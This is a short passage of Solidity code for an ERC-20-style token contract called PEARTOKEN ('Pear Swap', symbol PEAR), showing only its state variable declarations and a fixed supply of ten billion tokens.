...
contract PEARTOKEN is Ownable {
    address public razzcd78;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Pear Swap";
    string private _cctokensymbol = "PEAR";
